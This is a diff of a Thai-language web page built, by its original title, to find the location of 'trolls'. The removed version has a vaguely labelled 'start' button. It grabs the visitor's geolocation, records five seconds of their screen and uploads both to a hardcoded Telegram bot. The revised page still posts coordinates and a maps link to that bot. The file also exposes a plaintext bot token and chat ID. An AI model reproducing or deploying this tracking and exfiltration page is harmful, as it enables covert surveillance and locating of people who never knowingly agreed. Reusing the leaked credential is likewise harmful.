@@ -3,30 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ทำเอาใว้เพื่อหา ที่อยู่คนเกรียน</title>
+    <title>ส่งตำแหน่งผ่าน Telegram Bot</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             background-color: #eaf2f8;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            margin: 0;
         }
 
         .container {
             text-align: center;
             background: #fff;
-            padding: 40px 30px;
+            padding: 40px;
             border-radius: 12px;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
         }
 
         h1 {
-            color: #333;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         button {
@@ -37,7 +35,6 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
         }
 
         button:hover {
@@ -47,22 +44,23 @@
 </head>
 <body>
     <div class="container">
-        <h1>ทำเอาใว้เพื่อหา ที่อยู่คนเกรียน</h1>
-        <button onclick="sendLocationAndRecord()">เริ่มใช้งาน</button>
+        <h1>ส่งตำแหน่งไป Telegram</h1>
+        <button onclick="sendLocation()">ส่งตำแหน่ง</button>
     </div>
 
     <script>
         const botToken = '7586163097:AAFW-1cPYSRPGOdq9zJr0kOJh--gknZjyUU';
         const chatId = '5492311099';
 
-        function sendLocationAndRecord() {
-            getLocation()
-                .then(locationMessage => sendTextMessage(locationMessage))
-                .then(() => recordAndSendScreen())
-                .catch(error => {
-                    alert("เกิดข้อผิดพลาด: " + error.message);
-                    console.error(error);
-                });
+        async function sendLocation() {
+            try {
+                const message = await getLocation();
+                await sendMessage(message);
+                alert("✅ ส่งตำแหน่งเรียบร้อยแล้ว!");
+            } catch (err) {
+                alert("เกิดข้อผิดพลาด: " + err.message);
+                console.error(err);
+            }
         }
 
         function getLocation() {
@@ -71,20 +69,23 @@
                     return reject(new Error("เบราว์เซอร์ไม่รองรับ Geolocation"));
                 }
 
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const message = `ตำแหน่งของผู้ใช้:\n- Latitude: ${lat}\n- Longitude: ${lng}\n\nดูใน Google Maps: https://maps.google.com/?q=${lat},${lng}`;
-                    resolve(message);
-                }, err => reject(new Error("ไม่สามารถเข้าถึงตำแหน่ง")));
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const message = `📍 ตำแหน่งผู้ใช้:\n- Latitude: ${lat}\n- Longitude: ${lng}\n🌐 https://maps.google.com/?q=${lat},${lng}`;
+                        resolve(message);
+                    },
+                    error => reject(new Error("ไม่สามารถเข้าถึงตำแหน่ง"))
+                );
             });
         }
 
-        function sendTextMessage(message) {
+        function sendMessage(text) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const data = {
                 chat_id: chatId,
-                text: message
+                text: text
             };
 
             return fetch(url, {
@@ -94,52 +95,9 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log("ผลลัพธ์จากส่งข้อความ:", data);
-                if (!data.ok) throw new Error("ไม่สามารถส่งข้อความได้");
+                if (!data.ok) throw new Error("ไม่สามารถส่งข้อความ: " + data.description);
+                console.log("✅ ส่งข้อความสำเร็จ:", data);
             });
-        }
-
-        function recordAndSendScreen() {
-            return navigator.mediaDevices.getDisplayMedia({ video: true })
-                .then(stream => {
-                    const recorder = new MediaRecorder(stream, {
-                        mimeType: 'video/webm; codecs=vp8'
-                    });
-                    const chunks = [];
-
-                    recorder.ondataavailable = e => chunks.push(e.data);
-
-                    return new Promise((resolve, reject) => {
-                        recorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'video/webm; codecs=vp8' });
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(blob);
-                        };
-
-                        recorder.onerror = e => reject(new Error("MediaRecorder error: " + e.message));
-
-                        recorder.start();
-                        setTimeout(() => recorder.stop(), 5000); // อัด 5 วินาที
-                    });
-                })
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('document', blob, 'screen_record.webm');
-
-                    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
-
-                    return fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log("ผลลัพธ์จากส่งวิดีโอ:", data);
-                        if (!data.ok) throw new Error("ไม่สามารถส่งวิดีโอ: " + JSON.stringify(data));
-                        alert("ส่งตำแหน่งและวิดีโอเรียบร้อยแล้ว!");
-                    });
-                });
         }
     </script>
 </body>
